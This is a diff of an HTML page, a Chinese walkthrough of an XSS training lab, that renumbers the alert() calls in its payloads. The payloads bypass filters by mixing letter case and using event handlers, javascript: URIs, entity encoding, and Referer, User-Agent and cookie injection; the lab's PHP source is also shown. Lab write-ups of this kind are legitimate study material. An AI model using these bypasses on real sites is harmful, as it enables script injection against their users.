@@ -378,7 +378,7 @@
 <p><img src="https://upload-images.jianshu.io/upload_images/18851353-27c076c5cd8fdaaa.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1570178710972.png"></p>
 <p>上payload</p>
 <blockquote>
-<script>alert(1)</script>
+<script>alert(2)</script>
 </blockquote>
 <p>成功</p>
 <p><img src="https://upload-images.jianshu.io/upload_images/18851353-04d75558e7ae7e07.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1570178885846.png"></p>
@@ -387,19 +387,19 @@
 
 <p>将拿到的值 直接放入去echo，xss无疑</p>
 <p>然后测试了一下我收集的xss ，以下都可以通过</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;scRIpT&gt;new class extends confirm`4`&#123;&#125;&lt;/SCripT&gt; //绕过script大小写，括号，alert等函数</span><br><span class="line"></span><br><span class="line">&lt;script&gt;(((confirm)))`666`&lt;/script&gt; // 绕过括号，alert等函数限制</span><br><span class="line"></span><br><span class="line">&lt;script&gt;co\u006efirm(666)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;svg/onload=alert(1)&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;&#123;confirm`NB`&#125;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;alert`111`&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">%3c/title%3e%3cscript%3ealert`%22xss%22`%3c/script%3e</span><br><span class="line"></span><br><span class="line">其中有的虽然弹了xss 但是没有跳转到下一关</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;scRIpT&gt;new class extends confirm`4`&#123;&#125;&lt;/SCripT&gt; //绕过script大小写，括号，alert等函数</span><br><span class="line"></span><br><span class="line">&lt;script&gt;(((confirm)))`666`&lt;/script&gt; // 绕过括号，alert等函数限制</span><br><span class="line"></span><br><span class="line">&lt;script&gt;co\u006efirm(666)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;svg/onload=alert(2)&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;&#123;confirm`NB`&#125;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;alert`111`&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">%3c/title%3e%3cscript%3ealert`%22xss%22`%3c/script%3e</span><br><span class="line"></span><br><span class="line">其中有的虽然弹了xss 但是没有跳转到下一关</span><br></pre></td></tr></table></figure>
 
 <h3 id="Less2"><a href="#Less2" class="headerlink" title="Less2"></a>Less2</h3><p>看来这一关，有两个位置可以传参， 而且但是发现这两个位置是相同的，所以测试点只有一个</p>
 <p><img src="https://upload-images.jianshu.io/upload_images/18851353-41d8eab648e5b9c0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1570180389460.png"></p>
 <p>看一下前端，传入一个简单的xss，发现<code>&lt;&gt;</code>都被转义了。</p>
 <p><img src="https://upload-images.jianshu.io/upload_images/18851353-d284a9c6e4af1bed.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1570180493035.png"></p>
 <p>试试闭合</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: &quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt; // 绕过</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: &quot;&gt;&lt;script&gt;alert(2)&lt;/script&gt;&lt; // 绕过</span><br></pre></td></tr></table></figure>
 
 <p>这里加“ 的目的是闭合前面的值，之后添加xss脚本即可成功弹shell</p>
 <p><img src="https://upload-images.jianshu.io/upload_images/18851353-64e4334b34c3c335.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1570181010970.png"></p>
 <p>看看别人是如何弹的</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">&quot; onmouseover=alert(1)&gt; // 需要鼠标移动到输入框</span><br><span class="line">&quot; onclick=alert(1)&gt; // 需要点击</span><br><span class="line">&quot;&gt; &lt;img src = &quot;a&quot; onerror=&quot;alert(1)&quot;&gt;</span><br><span class="line">其实只要有“ 其他都随意了</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">&quot; onmouseover=alert(3)&gt; // 需要鼠标移动到输入框</span><br><span class="line">&quot; onclick=alert(4)&gt; // 需要点击</span><br><span class="line">&quot;&gt; &lt;img src = &quot;a&quot; onerror=&quot;alert(5)&quot;&gt;</span><br><span class="line">其实只要有“ 其他都随意了</span><br></pre></td></tr></table></figure>
 
 <p>在试试fuzz<br><code>劝各位少试 ，崩了别怪我没提醒</code></p>
 <p>差点忘记看源码了</p>
@@ -408,11 +408,11 @@
 <h3 id="Less3"><a href="#Less3" class="headerlink" title="Less3"></a>Less3</h3><blockquote>
 <p>先用简单的去看看</p>
 </blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&lt;script&gt;alert(1)&lt;/script&gt; //&quot;  &lt; &gt; 都被绕过&lt;/pre&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&lt;script&gt;alert(6)&lt;/script&gt; //&quot;  &lt; &gt; 都被绕过&lt;/pre&gt;</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://upload-images.jianshu.io/upload_images/18851353-4d7334bbd44f9507.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1570183909634.png"></p>
 <p>那么就需要没有这几个特征的,比如上一关提到的 点击事件和划过窗口事件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&apos; onmousedown=&apos;alert(1)  闭合</span><br><span class="line">&apos; onclick=&apos;alert(1)</span><br><span class="line">&lt;input name=keyword  value=&apos;&quot;.htmlspecialchars($str).&quot;onmousedown=&apos;alert(1) &apos;&gt;</span><br><span class="line">&apos; onmousedown=alert(1)// 注释</span><br><span class="line">&apos; onclick=alert(1)//</span><br><span class="line">&lt;input name=keyword  value=&apos;&quot;.htmlspecialchars($str).&quot;onclick=alert(1)// &apos;&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&apos; onmousedown=&apos;alert(7)  闭合</span><br><span class="line">&apos; onclick=&apos;alert(8)</span><br><span class="line">&lt;input name=keyword  value=&apos;&quot;.htmlspecialchars($str).&quot;onmousedown=&apos;alert(9) &apos;&gt;</span><br><span class="line">&apos; onmousedown=alert(10)// 注释</span><br><span class="line">&apos; onclick=alert(11)//</span><br><span class="line">&lt;input name=keyword  value=&apos;&quot;.htmlspecialchars($str).&quot;onclick=alert(12)// &apos;&gt;</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://upload-images.jianshu.io/upload_images/18851353-c868e170b7fcf8a1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1570184810646.png"></p>
 <p>看一下代码</p>
@@ -427,17 +427,17 @@
 <p>看看源码</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">$str2=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str2);</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;</span><br><span class="line">&lt;form action=level4.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&quot;&apos;.$str3.&apos;&quot;&gt;</span><br><span class="line">&lt;input type=submit name=submit value=搜索 /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">这里添加一个payload</span><br><span class="line">&quot;onfocus=alert(1) autofocus=&quot;   //onfocus 事件在对象获得焦点时发生。同样可以放在第三关去绕过</span><br><span class="line">或者 </span><br><span class="line">&quot; onfocus=alert(1) //</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">这里添加一个payload</span><br><span class="line">&quot;onfocus=alert(13) autofocus=&quot;   //onfocus 事件在对象获得焦点时发生。同样可以放在第三关去绕过</span><br><span class="line">或者 </span><br><span class="line">&quot; onfocus=alert(14) //</span><br></pre></td></tr></table></figure>
 
 <h3 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h3><p>先查看过滤的内容 经过测试发现 on，script被过滤了，这时尝试使用其他的函数绕过</p>
 <p><img src="https://upload-images.jianshu.io/upload_images/18851353-214e4b663b611ad4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1570188039661.png"></p>
 <p><img src="https://upload-images.jianshu.io/upload_images/18851353-57017760f651ebe2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1570188154325.png"></p>
 <p>这时想到还有javascript可以使用</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">&quot;&gt;&lt;iframe src=javascript:alert(1)&gt;</span><br><span class="line"></span><br><span class="line">&quot;&gt; &lt;iframe src=&quot;javascript:alert(1)&quot;&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">&quot;&gt;&lt;iframe src=javascript:alert(15)&gt;</span><br><span class="line"></span><br><span class="line">&quot;&gt; &lt;iframe src=&quot;javascript:alert(16)&quot;&gt;</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://upload-images.jianshu.io/upload_images/18851353-99c6e9d62e2d7eb1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1570188390066.png"></p>
 <p>但是没有出来下一关提示，别急，还有，herf也可以用</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a href=&quot;javascript:alert(17)&quot;&gt;</span><br></pre></td></tr></table></figure>
 
 <p>点击标签，成功绕过<br><img src="https://upload-images.jianshu.io/upload_images/18851353-bd78d719e2df57d1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1570188777396.png"></p>
 <p>看下源码</p>
@@ -448,15 +448,15 @@
 <p>随便输入，查看过滤了什么</p>
 </blockquote>
 <p><img src="https://upload-images.jianshu.io/upload_images/18851353-239f436b3718ebe2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1570189440237.png"></p>
-<p>‘ o_nmousedown=alert(1)//  script也被过滤了</p>
+<p>‘ o_nmousedown=alert(8)//  script也被过滤了</p>
 <p><img src="https://upload-images.jianshu.io/upload_images/18851353-beda4b67d17e6eda.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1570189440237.png"></p>
-<p>试试上一题的payload “&gt;<a href="javascript:alert(1)" target="_blank" rel="noopener"></a></p>
+<p>试试上一题的payload “&gt;<a href="javascript:alert(19)" target="_blank" rel="noopener"></a></p>
 <p>href 也被过滤了</p>
 <p><img src="https://upload-images.jianshu.io/upload_images/18851353-bb36fb53a6bed160.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1570189606811.png"></p>
 <p>src 也被过滤了</p>
 <p><img src="https://upload-images.jianshu.io/upload_images/18851353-42bd30262c324f23.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1570189606811.png"></p>
 <p>这时 有点蒙了，都过滤了，怎么测，想起来还有个大小写没有试<br>果然 天无绝人之路 大小写没有过滤</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;iframe sRc=javascript:alert(1)&gt;</span><br><span class="line">&quot;&gt;&lt;a hREf=&quot;javascript:alert(1)&quot;&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;iframe sRc=javascript:alert(20)&gt;</span><br><span class="line">&quot;&gt;&lt;a hREf=&quot;javascript:alert(21)&quot;&gt;</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://upload-images.jianshu.io/upload_images/18851353-8d715f68b44d517b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1570189698861.png"></p>
 <p>看看源码</p>
@@ -484,7 +484,7 @@
 <p>百度一下，发现可以通过编码去绕过，通过html字符实体转换 将 r 换为&amp;#x72</p>
 <p>成功绕过替换</p>
 </blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">javascrip&amp;#x74;:alert(1)</span><br><span class="line">javasc&amp;#x72;ipt:alert`1`</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">javascrip&amp;#x74;:alert(22)</span><br><span class="line">javasc&amp;#x72;ipt:alert`1`</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://upload-images.jianshu.io/upload_images/18851353-086fea2968c66894.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1570191396570.png"></p>
 <p>看看源码</p>
@@ -493,7 +493,7 @@
 <h3 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h3><blockquote>
 <p>常规判断<br>这次没有任何回显，只给了不合法，难度比之前的有很大的提升，这次绕过让我忽略了一个问题，友情链接没有网址那叫链接吗，百度了下绕过，发现一只忽略了一个最重要的问题</p>
 </blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">javascrip&amp;#74;:alert(1)//http://www.baidu.com&lt;/pre&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">javascrip&amp;#74;:alert(23)//http://www.baidu.com&lt;/pre&gt;</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://upload-images.jianshu.io/upload_images/18851353-2bbb4b67ab6eaa73.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1570197241007.png"></p>
 <p>看看源码</p>
@@ -503,7 +503,7 @@
 <p>慢慢的难度提升了，这道题直接闭合不了，基本没有测出来什么东西，抓个包看看吧，也没啥，看看源代码，看到有三个参数是hidden的，尝试传参</p>
 </blockquote>
 <p><img src="https://upload-images.jianshu.io/upload_images/18851353-9fafa705745e1512.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1570204862947.png"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">keyword=1&amp;t_sort=&quot;type=&quot;text&quot; onclick=&quot;alert(1)</span><br><span class="line"></span><br><span class="line">&lt;input name=&quot;t_sort&quot; value=&quot; &quot; type=&quot;text&quot; onclick = &quot;alert(1)&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">type=&quot;text&quot; 指定后可以将hidden内容显示&lt;/pre&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">keyword=1&amp;t_sort=&quot;type=&quot;text&quot; onclick=&quot;alert(24)</span><br><span class="line"></span><br><span class="line">&lt;input name=&quot;t_sort&quot; value=&quot; &quot; type=&quot;text&quot; onclick = &quot;alert(25)&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">type=&quot;text&quot; 指定后可以将hidden内容显示&lt;/pre&gt;</span><br></pre></td></tr></table></figure>
 
 <p>创建一个文本框，然后去点击</p>
 <p><img src="https://upload-images.jianshu.io/upload_images/18851353-ba2f8df49dc05d13.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1570204987345.png"></p>
@@ -511,12 +511,12 @@
 
 <h3 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h3><p>和10题类似，同样有隐藏的内容，尝试type指定为text查看</p>
 <p><img src="https://upload-images.jianshu.io/upload_images/18851353-a9fb4b946d863db0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1570242428551.png"></p>
-<p>keyword=good job!&amp;t_sort=”type=”text” onclick=”alert(1) 被转义了，看来这里很难绕过了。请教了下百度</p>
+<p>keyword=good job!&amp;t_sort=”type=”text” onclick=”alert(26) 被转义了，看来这里很难绕过了。请教了下百度</p>
 <p><img src="https://upload-images.jianshu.io/upload_images/18851353-97ca31f071cca067.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1570242567789.png"></p>
 <p> 这题先看源码吧</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">$str00 = $_GET[&quot;t_sort&quot;];</span><br><span class="line">$str11=$_SERVER[&apos;HTTP_REFERER&apos;];</span><br><span class="line">$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</span><br><span class="line">$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;</span><br><span class="line">&lt;form id=search&gt;</span><br><span class="line">&lt;input name=&quot;t_link&quot;  value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_history&quot;  value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_sort&quot;  value=&quot;&apos;.htmlspecialchars($str00).&apos;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_ref&quot;  value=&quot;&apos;.$str33.&apos;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&apos;;</span><br><span class="line">?&gt;</span><br><span class="line">果然，这道题的关键点在str11参数，获取referer处，查看前端源码也可以获取到一个t_ref变量，那么对于str11只过滤了&lt;&gt; 这样就可以使用on去绕过了</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload 抓包 在Referer处添加</span><br><span class="line">“ onmouseover=alert(1) type=&quot;text&quot;&lt;/pre&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload 抓包 在Referer处添加</span><br><span class="line">“ onmouseover=alert(26) type=&quot;text&quot;&lt;/pre&gt;</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://upload-images.jianshu.io/upload_images/18851353-eea57022dca81921.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1570243195814.png"></p>
 <h3 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h3><blockquote>
@@ -525,7 +525,7 @@
 </blockquote>
 <p><img src="https://upload-images.jianshu.io/upload_images/18851353-7b6af3dd50b2c246.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1570243379119.png"></p>
 <p>果然，在ua处添加xss代码成功弹xss</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">&quot; onclick=alert(1) type=&quot;text&quot;&lt;/pre&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">&quot; onclick=alert(27) type=&quot;text&quot;&lt;/pre&gt;</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://upload-images.jianshu.io/upload_images/18851353-a0cc3f832c6133b3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1570243485003.png"></p>
 <p>看看源码</p>
@@ -539,7 +539,7 @@
 <p>抓包 修改cookie，尝试弹xss</p>
 </blockquote>
 <p><img src="https://upload-images.jianshu.io/upload_images/18851353-3a400589fc87461a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1570243693173.png"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">&quot; onmousedown=alert(1) type=&quot;text&quot;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">&quot; onmousedown=alert(28) type=&quot;text&quot;</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://upload-images.jianshu.io/upload_images/18851353-dc5339724c2342ef.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1570243732008.png"></p>
 <p>看看源码</p>
@@ -551,7 +551,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;&lt;head&gt;&lt;title&gt;Loading...&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;script type=&apos;text/javascript&apos;&gt;window.location.replace(&apos;http://www.exifviewer.org/?js=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJKb2tlbiIsImV4cCI6MTU3MDI1MzMxNCwiaWF0IjoxNTcwMjQ2MTE0LCJpc3MiOiJKb2tlbiIsImpzIjoxLCJqdGkiOiIybjVhNTFjNXM3dWg3cnY1aW8wMDlya2YiLCJuYmYiOjE1NzAyNDYxMTQsInRzIjoxNTcwMjQ2MTE0NDUyNTIyfQ.T1jdJkux82fMYT9U0brel9BKH1n0876y_n_pLpdTug0&amp;sid=74b4763c-e71f-11e9-875c-26f312502ec5&apos;);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;&lt;/pre&gt;</span><br></pre></td></tr></table></figure>
 
 <p>这关不知道怎么过了，再次百度,</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload  exif viewer的漏洞,漏洞原理是通过修改图片的exif信息</span><br><span class="line"> &quot;&gt;&lt;img src=1 onerror=alert(1)&gt;&lt;/pre&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload  exif viewer的漏洞,漏洞原理是通过修改图片的exif信息</span><br><span class="line"> &quot;&gt;&lt;img src=1 onerror=alert(29)&gt;&lt;/pre&gt;</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level14&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level14&lt;/h1&gt;</span><br><span class="line">&lt;center&gt;&lt;iframe name=&quot;leftframe&quot; marginwidth=10 marginheight=10 src=&quot;http://www.exifviewer.org/&quot; frameborder=no width=&quot;80%&quot; scrolling=&quot;no&quot; height=80%&gt;&lt;/iframe&gt;&lt;/center&gt;&lt;center&gt;这关成功后不会自动跳转。成功者&lt;a href=/xsschallenge/level15.php?src=1.gif&gt;点我进level15&lt;/a&gt;&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">这关好像没php代码，果然崩了下一关</span><br></pre></td></tr></table></figure>
 
@@ -560,14 +560,14 @@
 
 <p>打不成功，查看没有反应，这关考的是对于ng-include 通过文件包含加载xss</p>
 <p>放几个网上找来的payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line"></span><br><span class="line">&apos;level1.php?name=&lt;script&gt;alert(1)&lt;/script&gt;&apos;</span><br><span class="line">&apos;level1.php?name=&lt;img src=x onerror=alert(1)&gt;&apos;&lt;/pre&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line"></span><br><span class="line">&apos;level1.php?name=&lt;script&gt;alert(30)&lt;/script&gt;&apos;</span><br><span class="line">&apos;level1.php?name=&lt;img src=x onerror=alert(31)&gt;&apos;&lt;/pre&gt;</span><br></pre></td></tr></table></figure>
 
 <h3 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h3><blockquote>
 <p>测试输入，感觉又和之前的比较相似了</p>
 </blockquote>
 <p><img src="https://upload-images.jianshu.io/upload_images/18851353-9048d5550fed076a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1570247865284.png"></p>
 <p>过滤了script，/ , 空格也被替换了,尝试使用%0a代替空格</p>
